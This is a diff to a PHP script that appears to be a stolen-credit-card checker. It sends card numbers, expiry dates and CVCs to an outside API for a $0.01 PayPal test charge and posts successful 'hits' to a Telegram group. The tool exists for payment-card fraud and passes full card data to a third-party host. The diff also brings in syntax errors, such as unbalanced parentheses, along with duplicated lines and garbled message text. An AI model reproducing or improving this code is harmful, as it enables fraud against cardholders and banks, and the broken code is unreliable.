@@ -1,4 +1,7 @@
 <?php
+// Include globalstats.php for database connection and statistics recording
+require_once __DIR__ . '/globalstats.php';
+
 // FOR DEBUGGING: If you get a 500 error, uncomment the lines below to see the exact error
 // ini_set('display_errors', 1);
 // error_reporting(E_ALL);
@@ -255,13 +258,13 @@ function sendTelegramNotification($card_details, $status, $response, $originalAp
     $formatted_response = formatResponse($response);
 
     // Construct Telegram message
-    $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! ]━━✦</b>\n" .
-               "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
+    $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐄𝐄𝐂𝐄𝐄𝐄𝐄𝐄! ]━━✦</b>\n" .
+               "<a href=\"$group_link\">[⌇�]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
                "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
                "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
                "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
                "<b>――――――――――――</b>\n" .
-               "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";
+               "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑑𝑫 ✘ 𝑪𝑯𝑲</a>";
 
     // Send to Telegram
     $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage";
@@ -288,12 +291,6 @@ function sendTelegramNotification($card_details, $status, $response, $originalAp
     } else {
         log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
     }
-}
-
-// Check if card details are provided
-if (!isset($_POST['card']) || !is_array($_POST['card'])) {
-    echo json_encode(['status' => 'ERROR', 'message' => 'Card details not provided']);
-    exit;
 }
 
 // Function to check a single card via PayPal 0.1$ API
@@ -334,7 +331,7 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
                 continue;
             }
             log_message("Failed for $card_details: $curl_error (HTTP $http_code, cURL errno $curl_errno)");
-            $last_result = "DECLINED [API request failed: $curl_error (HTTP $http_code, cURL errno $curl_errno)]";
+            $last_result = "DECLINED [API request failed: $curl_error (HTTP $http_code, cURL errno $curl_errno)";
             return $last_result;
         }
 
@@ -367,13 +364,13 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
         $last_result = "$final_status [$response_msg]";
         log_message("$final_status for $card_details: $response_msg");
 
+        // Send Telegram notification for CHARGED or APPROVED (only once)
+        if ($final_status === 'CHARGED' || $final_status === 'APPROVED') {
+            sendTelegramNotification($card_details, $final_status, $last_result, $response);
+        }
+
         // If we got a valid response, don't retry
         break;
-    }
-
-    // Send Telegram notification for CHARGED or APPROVED (only once)
-    if ($final_status === 'CHARGED' || $final_status === 'APPROVED') {
-        sendTelegramNotification($card_details, $final_status, $last_result, $last_response);
     }
 
     return $last_result;
@@ -410,13 +407,15 @@ function checkCardsParallel($cards, $max_concurrent = 3) {
         } elseif (strlen($exp_year_raw) == 4) {
             $exp_year = (int) $exp_year_raw;
         } else {
-            $exp_year = (int) date('Y') + 1;
+            $exp_year = (int) date('Y') + 1);
         }
 
         $card_details = "$card_number|$exp_month|$exp_year|$cvc";
-        $card_details_map[$index] = $card_details;
         $encoded_cc = urlencode($card_details);
         $api_url = "https://rocks-y.onrender.com/gateway=paypal0.1$/cc=?cc=$encoded_cc";
+        $card_details_map[$index] = $card_details;
+        $encoded_cc = urlencode($card_details);
+        $api_url = "https://rocks-y.onrender.com/gateway=paypal0.1$/cc=$encoded_cc";
 
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $api_url);
@@ -465,7 +464,7 @@ function checkCardsParallel($cards, $max_concurrent = 3) {
 
         $final_status = 'DECLINED';
         $response_msg = $result['response'] ?? 'Unknown error';
-        
+
         if ($message === 'CARD ADDED') {
             $final_status = 'CHARGED';
             $response_msg = 'Your $0.01 payment was successful.';
@@ -526,7 +525,7 @@ if (is_array($_POST['card']) && isset($_POST['card']['number'])) {
         $card_year = (int) $exp_year_raw;
         $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
     } elseif (strlen($exp_year_raw) == 4) {
-        $exp_year = (int) $exp_year_raw;
+        $exp_year = (int) $exp_year_raw);
     } else {
         log_message("Invalid exp_year format: $exp_year_raw");
         echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid exp_year format - must be YY or YYYY']);
